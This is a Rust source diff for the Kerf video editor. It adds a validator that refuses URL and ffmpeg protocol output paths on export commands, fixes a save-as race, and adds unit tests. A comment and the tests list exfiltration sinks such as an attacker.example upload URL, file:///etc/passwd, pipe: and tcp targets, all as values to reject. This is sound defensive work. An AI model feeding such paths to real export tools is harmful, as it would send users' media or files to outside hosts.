@@ -103,6 +103,43 @@ fn parse_transition(kind: Option<String>, duration: Option<f64>) -> CmdResult<Op
     }
 }
 
+/// Reject a caller-supplied output path that names an ffmpeg protocol sink
+/// (`rtmp://…`, `http://…`, `pipe:1`, `concat:a|b`, …) instead of a plain
+/// local file, and require it be absolute. ffmpeg resolves the protocol (and
+/// a relative path resolves) from the string alone with no local file ever
+/// written to look suspicious — this is what stops
+/// `export(output_path="https://attacker.example/upload")` from making Kerf's
+/// own ffmpeg stream the timeline off the machine.
+///
+/// A single ASCII letter immediately before a `:` that is followed by `\` or
+/// `/` is a Windows drive letter (`C:\Users\...`), not a protocol scheme —
+/// ffmpeg itself special-cases this the same way, so it is let through.
+pub(crate) fn require_local_output_path(path: &str) -> Result<(), String> {
+    if let Some(colon) = path.find(':') {
+        let scheme = &path[..colon];
+        let after = &path[colon + 1..];
+        let is_drive_letter =
+            scheme.len() == 1 && scheme.chars().all(|c| c.is_ascii_alphabetic()) && after.starts_with(['\\', '/']);
+        let looks_like_scheme = !scheme.is_empty()
+            && scheme.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
+            && scheme
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
+        if looks_like_scheme && !is_drive_letter {
+            return Err(format!(
+                "output path {path:?} looks like a URL or ffmpeg protocol sink, not a local file path"
+            ));
+        }
+    }
+    let bytes = path.as_bytes();
+    let is_windows_absolute =
+        bytes.len() >= 3 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && matches!(bytes[2], b'\\' | b'/');
+    if !(path.starts_with('/') || path.starts_with("\\\\") || is_windows_absolute) {
+        return Err(format!("output path {path:?} must be an absolute local file path"));
+    }
+    Ok(())
+}
+
 // ---- read ------------------------------------------------------------------
 
 #[tauri::command(async)]
@@ -178,16 +215,48 @@ async fn open_project(app: AppHandle, state: State<'_, AppState>, path: String) 
     .await
 }
 
+/// Everything an edit can change while `save_project_as` has the lock released:
+/// the cut, the media, the task queue and a staged proposal. Content rather than
+/// the revision seq, which an undo followed by a new edit recycles.
+fn project_fingerprint(project: &Project) -> CmdResult<String> {
+    let err = |e: kerf_core::Error| e.to_string();
+    serde_json::to_string(&(
+        project.timeline().map_err(err)?,
+        project.list_assets().map_err(err)?,
+        project.list_tasks().map_err(err)?,
+        project.staged().map_err(err)?,
+    ))
+    .map_err(|e| e.to_string())
+}
+
 /// Snapshot the current project to a new `.kerf` file and switch to it, so
 /// subsequent edits (from the GUI and the agent alike) write through to disk.
 /// Returns the saved path.
+///
+/// The reopen runs with the lock released, like `open_project`, so a slow
+/// filesystem doesn't freeze the GUI and every MCP call. An edit landing in that
+/// window would be on the old project, so the reopened one is only swapped in
+/// if nothing changed; otherwise the save is redone under one held lock.
 #[tauri::command]
 async fn save_project_as(state: State<'_, AppState>, path: String) -> CmdResult<Option<String>> {
     let shared = state.project.clone();
     blocking(move || {
+        let before = {
+            let project = lock_user(&shared);
+            project.save_as(&path).map_err(|e| e.to_string())?;
+            project_fingerprint(&project)?
+        };
+        let opened = Project::open(&path).map_err(|e| e.to_string())?;
         let mut project = lock_user(&shared);
-        project.save_as(&path).map_err(|e| e.to_string())?;
-        *project = Project::open(&path).map_err(|e| e.to_string())?;
+        if project_fingerprint(&project)? == before {
+            *project = opened;
+        } else {
+            // Close the stale copy first: `save_as` deletes the file it replaces,
+            // which Windows refuses while it is open.
+            drop(opened);
+            project.save_as(&path).map_err(|e| e.to_string())?;
+            *project = Project::open(&path).map_err(|e| e.to_string())?;
+        }
         Ok(project.path().map(|p| p.display().to_string()))
     })
     .await
@@ -960,6 +1029,7 @@ fn clear_captions(state: State<'_, AppState>) -> CmdResult<Timeline> {
 #[tauri::command]
 async fn export_srt(state: State<'_, AppState>, asset_id: String, output_path: String) -> CmdResult<String> {
     let id = id(&asset_id)?;
+    require_local_output_path(&output_path)?;
     let shared = state.project.clone();
     blocking(move || {
         let srt = lock_user(&shared).transcript_srt(id).map_err(|e| e.to_string())?;
@@ -1330,6 +1400,7 @@ async fn export_timeline(
     output_path: String,
     options: ExportOptions,
 ) -> CmdResult<String> {
+    require_local_output_path(&output_path)?;
     // Snapshot the timeline + assets under the lock, then release it before the
     // (seconds-to-minutes) ffmpeg render. Otherwise the export would hold the
     // shared Project mutex for its whole duration and freeze every other GUI
@@ -1391,6 +1462,7 @@ async fn export_variants(
     if formats.is_empty() {
         return Err("pick at least one delivery frame".to_string());
     }
+    require_local_output_path(&output_path)?;
     let base = std::path::PathBuf::from(&output_path);
     let mut deliveries: Vec<Delivery> = Vec::new();
     for d in formats {
@@ -1454,6 +1526,7 @@ async fn export_cover(
     output_path: String,
     format: Option<kerf_core::ImageFormat>,
 ) -> CmdResult<String> {
+    require_local_output_path(&output_path)?;
     let shared = state.project.clone();
     blocking(move || {
         // Same shape as every heavy command: resolve under the lock, render
@@ -1882,4 +1955,52 @@ pub fn run() {
         ])
         .run(tauri::generate_context!())
         .expect("error while running Kerf");
+}
+
+#[cfg(test)]
+mod tests {
+    use super::require_local_output_path;
+
+    #[test]
+    fn accepts_absolute_local_paths() {
+        assert!(require_local_output_path("/home/user/out.mp4").is_ok());
+        assert!(require_local_output_path("C:\\Users\\me\\out.mp4").is_ok());
+        assert!(require_local_output_path("c:/Users/me/out.mp4").is_ok());
+        assert!(require_local_output_path("\\\\server\\share\\out.mp4").is_ok());
+    }
+
+    #[test]
+    fn rejects_relative_paths() {
+        assert!(require_local_output_path("out.mp4").is_err());
+        assert!(require_local_output_path("renders/out.mp4").is_err());
+        assert!(require_local_output_path("Users\\me\\out.mp4").is_err());
+    }
+
+    #[test]
+    fn rejects_protocol_urls() {
+        for bad in [
+            "rtmp://example.com/live",
+            "https://attacker.example/upload",
+            "http://127.0.0.1:8080/x",
+            "udp://239.0.0.1:1234",
+            "file:///etc/passwd",
+        ] {
+            assert!(require_local_output_path(bad).is_err(), "{bad} should be rejected");
+        }
+    }
+
+    #[test]
+    fn rejects_bare_ffmpeg_protocol_prefixes() {
+        for bad in ["pipe:1", "pipe:", "concat:a.mp4|b.mp4", "async:tcp://host:1234"] {
+            assert!(require_local_output_path(bad).is_err(), "{bad} should be rejected");
+        }
+    }
+
+    #[test]
+    fn windows_drive_letter_is_not_a_protocol() {
+        // A lone drive letter followed by a path separator must never be
+        // mistaken for a scheme — this is the whole reason the check isn't
+        // just "contains a colon".
+        assert!(require_local_output_path("D:\\video\\clip.mov").is_ok());
+    }
 }
